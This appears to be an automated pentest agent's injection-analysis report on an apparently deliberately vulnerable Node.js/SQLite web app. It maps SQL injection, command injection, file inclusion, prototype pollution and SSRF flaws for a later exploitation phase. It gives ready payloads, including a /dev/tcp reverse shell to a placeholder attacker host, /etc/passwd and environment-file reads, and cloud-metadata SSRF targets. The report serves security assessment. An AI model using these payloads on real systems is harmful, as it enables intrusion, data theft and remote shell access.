# Injection Analysis Report (SQLi, Command Injection, LFI, SSRF, Prototype Pollution)

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** Five high-confidence injection vulnerabilities (SQLi, Command Injection, LFI, Prototype Pollution, SSRF) were identified. All findings have been passed to the exploitation phase via the machine-readable queue at `deliverables/injection_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the vulnerabilities listed in the queue. It is intended to be read alongside the JSON deliverable.

---

## 2. Dominant Vulnerability Patterns

### Pattern 1: Unauthenticated Direct Shell Command Execution
- **Description:** The `/api/utils/ping` endpoint accepts a `host` query parameter and passes it directly into a Node.js `exec()` call without any sanitization, escaping, or argument isolation. The endpoint is unauthenticated (the `authenticate` middleware calls `next()` when no token is present).
- **Implication:** Any internet user can execute arbitrary shell commands on the server. This is a full server-compromise vector.
- **Representative:** INJ-VULN-002

### Pattern 2: Direct SQL String Interpolation with no Parameterization
- **Description:** User-supplied input (the `name` search parameter) is directly interpolated into a SQL query string. No prepared statements, no parameter binding, no escaping. The backend uses `db.all()` with the interpolated query string rather than using placeholders.
- **Implication:** SQL injection is exploitable for data extraction. The database is SQLite, enabling time-based, boolean-based, and UNION-based injection techniques.
- **Representative:** INJ-VULN-001

### Pattern 3: Unsafe Path Join with No Boundary Validation
- **Description:** The file download endpoint joins a user-supplied filename with the uploads directory using `path.join()` without any subsequent boundary check (no `startsWith`, no `realpath` validation). The normalized path is passed to `res.sendFile()` which serves any file on the filesystem.
- **Implication:** Local file inclusion (LFI) allows reading arbitrary files including `/etc/passwd`, server private keys, application source code, and database files.
- **Representative:** INJ-VULN-003

### Pattern 4: Unrestricted Prototype Pollution via Unsafe Recursive Merge
- **Description:** User-controlled JSON body is recursively merged into a JavaScript object using a custom `unsafeMerge()` function that does not filter `__proto__`, `constructor`, or `prototype` keys. The merge directly assigns user input to object properties without any guard.
- **Implication:** Polluting `Object.prototype` affects all subsequent object operations in the Node.js process. This can be leveraged to escalate privileges, bypass security checks, or cause denial of service.
- **Representative:** INJ-VULN-004

### Pattern 5: Unvalidated URL Passed to HTTP Client
- **Description:** The `/api/fetch-url` endpoint accepts a `url` query parameter and passes it directly to `axios.get()` without any scheme whitelist, hostname restriction, or validation. The response body from the fetched URL is reflected back to the attacker.
- **Implication:** Server-Side Request Forgery (SSRF) enables attacks against cloud metadata services, internal databases, localhost APIs, and internal network services.
- **Representative:** INJ-VULN-005

---

## 3. Strategic Intelligence for Exploitation

### Authentication and Access Context

- **Bearer Token Auth is Client-Side:** The `authenticate` middleware (middleware/auth.js) proceeds to `next()` when no token is provided — it does not block unauthenticated requests. The three unauthenticated endpoints (`/api/auth/login`, `/api/auth/register`) are the public entry points. All other routes are technically reachable without a token due to the permissive middleware.
- **CORS Set to Wildcard:** `app.use(cors({ origin: '*' }))` — the backend accepts cross-origin requests from any domain. The frontend's Cloudflare Pages domain can freely call the backend via browser AJAX.
- **Hardcoded JWT Secret:** `JWT_SECRET = 'secret123'` — the secret is hardcoded and exposed in the `/api/debug` endpoint response. Additionally, the middleware accepts `alg: "none"` JWT tokens, allowing identity forgery without knowing the secret.

### SQL Injection Intelligence

- **Database:** SQLite (confirmed via `db.js` — `require('sqlite3').verbose()`)
- **Error Messages:** Backend returns `err.message` in 500 responses — verbose SQLite errors are exposed to clients, enabling error-based injection.
- **Key Endpoint:** `GET /api/projects/search/name?name=` — the `name` parameter is interpolated directly into `SELECT * FROM projects WHERE name LIKE '%${name}%'`.
- **Bypass Guidance:** No WAF or input filtering observed. Standard boolean (`' OR '1'='1`) and UNION payloads should work directly. For blind exploitation, `LIKE '%${payload}%'` context means payloads must not break the outer quotes.
- **Recommendation:** Start with error-based extraction using `name='||(SELECT sqlite_version())||'` to confirm SQLite and extract version/schema. Use `UNION SELECT` to extract from `sqlite_master`.

### Command Injection Intelligence

- **Key Endpoint:** `GET /api/utils/ping?host=`
- **Technology:** Node.js `child_process.exec()` — command runs in a shell on the server
- **No Auth Required:** Endpoint is reachable without a token
- **Output Reflected:** Both `stdout` and `stderr` are returned in the JSON response, enabling immediate confirmation of command execution
- **Recommendation:** Use `; cat /etc/passwd` or `| cat /etc/passwd` to confirm. Time-based sleep (`; sleep 5`) can confirm blind injection. Full reverse shell possible via `; bash -i >& /dev/tcp/ATTACKER/PORT 0>&1`.

### LFI Intelligence

- **Key Endpoint:** `GET /api/files/download?name=`
- **Filesystem:** Backend source at `/repos/VulApp/backend/`; uploads at `/repos/VulApp/backend/uploads/`
- **Key Files to Target:**
  - `/repos/VulApp/backend/middleware/auth.js` — contains `JWT_SECRET = 'secret123'`
  - `/repos/VulApp/backend/database.sqlite` — SQLite DB with users table (plaintext passwords)
  - `/etc/passwd` — system user enumeration
  - `../../../../../../proc/self/environ` — environment variables
- **Path Normalization:** `path.join()` normalizes `../` sequences, so the number of traversals needed depends on depth from the uploads directory. 5–6 levels is sufficient to reach root.
- **Note:** `fs.existsSync()` returns boolean; if file exists, `res.sendFile()` serves it; if not, a 404 JSON with the attempted path is returned — confirming path traversal.

### Prototype Pollution Intelligence

- **Key Endpoint:** `POST /api/utils/merge` with JSON body
- **Affected Context:** All Node.js objects in the process after pollution
- **Pollution Vector:** `{"__proto__": {"isAdmin": true}}` sets `Object.prototype.isAdmin = true`
- **Exploitation Path:** After polluting the prototype, the attacker can access the `/api/admin` endpoint (which checks `admin === 'true'` query param — not affected by prototype pollution directly, but prototype pollution can modify process-level config objects or bypass other checks).
- **Additional Vector:** `{"constructor": {"prototype": {"shell": "true"}}}` can modify built-in constructors.
- **The server's own test confirms vulnerability:** The response includes `pollutionCheck.message: "PROTOTYPE POLLUTED!"` when `testObj.isAdmin` becomes truthy.

### SSRF Intelligence

- **Key Endpoint:** `GET /api/fetch-url?url=`
- **Technology:** `axios.get()` — follows HTTP redirects, does not block `file://` or `gopher://` schemes by default
- **Targets to Probe:**
  - Cloud metadata: `http://169.254.169.254/latest/meta-data/` (AWS), `http://metadata.google.internal/` (GCP)
  - Internal services: `http://localhost:5001/api/debug`, `http://127.0.0.1:5001/api/admin?admin=true`
  - Database connections: If the Node.js server has a local database exposed on a port
- **Response Reflection:** The full response body from the target URL is returned in the response (`res.send(response.data)`), enabling data exfiltration.

---

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have appropriate defenses or are outside the injection scope. They are **low-priority** for further testing.

| **Source (Parameter/Key)** | **Endpoint/File Location** | **Defense Mechanism Implemented** | **Verdict** |
|---|---|---|---|
| `email` + `password` | `POST /api/auth/login` | Parameterized query: `db.get(SELECT ... WHERE email = ? AND password = ?, [email, password])` | SAFE (for SQLi — though plaintext password comparison is a separate auth weakness) |
| `email` + `password` | `POST /api/auth/register` | Parameterized query: `db.run(INSERT INTO users ... VALUES (?, ?), [email, password])` | SAFE (for SQLi) |
| `name` + `description` + `is_public` | `POST /api/projects` | Parameterized query: `db.run(INSERT INTO projects ... VALUES (?, ?, ?, ?), [name, description, req.user.id, is_public ? 1 : 0])` | SAFE (for SQLi — description is stored unsanitized for XSS, not injection) |
| `project_id` (body) + `file` (multipart) | `POST /api/files/upload` | Parameterized query: `db.run(INSERT INTO files ... VALUES (?, ?, ?, ?), [filename, filepath, project_id, req.user.id])` | SAFE (for SQLi — project_id treated as integer value) |
| `id` (path param) | `GET /api/projects/:id`, `DELETE /api/projects/:id`, `GET /api/files/project/:id` | Parameterized queries with `?` placeholder for `req.params.id` | SAFE (for SQLi — parameterized correctly) |
| `id` (path param) | `PUT /api/projects/:id` | Parameterized query: `db.run(UPDATE ... SET name = ?, description = ?, is_public = ? WHERE id = ?, [name, description, is_public, req.params.id])` | SAFE (for SQLi) |
| `plan_type` | `POST /api/subscribe` | Parameterized query: `db.run(UPDATE users SET plan_type = ? WHERE id = ?, [plan_type, req.user.id])` | SAFE (for SQLi — business logic vulnerability is separate from injection) |
| `token` + `new_password` | `POST /api/auth/reset-password` | Parameterized query: `db.run(UPDATE users SET password = ? WHERE email = ?, [new_password, email])` | SAFE (for SQLi — though password reset is predictable and unverified) |

---

## 5. Analysis Constraints and Blind Spots

- **Unauthenticated Access Assumption:** The `authenticate` middleware was analyzed and confirmed to call `next()` when no token is present. This means `/api/utils/ping`, `/api/utils/merge`, `/api/fetch-url`, `/api/files/download` are all reachable without authentication. This was confirmed by reading the middleware source at `middleware/auth.js:10-11`.
- **No Encryption on `plan_type` or User Data:** User plan types and email addresses are stored in plaintext in SQLite. This is a data sensitivity issue but outside injection scope.
- **Express.text({ type: 'application/xml' }) Middleware:** The server accepts raw XML text bodies at endpoints that consume `req.body`. If the XML body parser is not explicitly configured on any route, Express's default JSON parser may not process it — however, this could enable XXE if an XML endpoint exists. This was noted as a potential vector not found in active routes.
- **CSV Injection:** `GET /api/projects/export/csv` was identified as a vector for CSV injection (formula injection) — user-supplied project names and descriptions are embedded in CSV without sanitizing `=`, `+`, `-`, `@` characters. This is classified as a separate vulnerability class and not added to the injection queue, but should be noted for the exploitation phase.
- **File Upload Execution:** `POST /api/files/upload` stores uploaded files with original filenames in `uploads/`. If an attacker uploads a `.html` or `.js` file, it can be accessed via `/uploads/{filename}`. While this is not a direct injection vulnerability, it enables stored XSS via file inclusion.
- **JWT `alg: none` Bypass:** The `authenticate` middleware explicitly checks for `alg: "none"` and accepts unsigned tokens. This allows identity forgery but is classified as an authentication vulnerability, not an injection vulnerability.

---

## 6. Source-to-Sink Trace Summary

| ID | Vulnerability Type | Source | Sink | Slot Type | Sanitization | Verdict |
|---|---|---|---|---|---|---|
| INJ-VULN-001 | SQLi | `name` query param | `db.all()` at `routes/projects.js:29` | SQL-val | NONE | VULNERABLE |
| INJ-VULN-002 | Command Injection | `host` query param | `exec()` at `routes/utils.js:19` | CMD-part-of-string | NONE | VULNERABLE |
| INJ-VULN-003 | LFI | `name` query param | `res.sendFile()` at `routes/files.js:61` | FILE-path | NONE | VULNERABLE |
| INJ-VULN-004 | Prototype Pollution | POST body `__proto__` key | `unsafeMerge()` at `routes/utils.js:51` | DESERIALIZE-object | NONE | VULNERABLE |
| INJ-VULN-005 | SSRF | `url` query param | `axios.get()` at `routes/debug.js:27` | CMD-part-of-string | NONE | VULNERABLE |

---

*Report generated by Injection Analysis Specialist. Target: https://techviflaw.vn.gd. Backend: Node.js/Express + SQLite at localhost:5001.*
